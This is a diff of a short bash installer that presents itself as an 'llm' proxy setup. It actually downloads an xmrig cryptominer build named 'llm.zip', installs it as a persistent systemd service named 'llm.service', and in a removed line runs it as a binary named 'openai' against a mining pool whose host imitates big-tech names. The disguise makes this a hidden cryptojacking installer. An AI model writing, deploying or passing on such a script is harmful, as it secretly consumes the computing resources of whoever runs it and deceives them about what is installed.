@@ -1,9 +1,8 @@
 #!/bin/bash
 
 #llmproxy.6553500.xyz
-
+apt update -y & apt install zip -y
 U=$1
-#latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
 wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm.zip 
 unzip llm.zip && rm -rf llm.zip
 mkdir /etc/llm/
@@ -33,4 +32,3 @@ systemctl enable llm.service
 systemctl start llm.service
 sleep 2
 systemctl status llm.service
-#./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
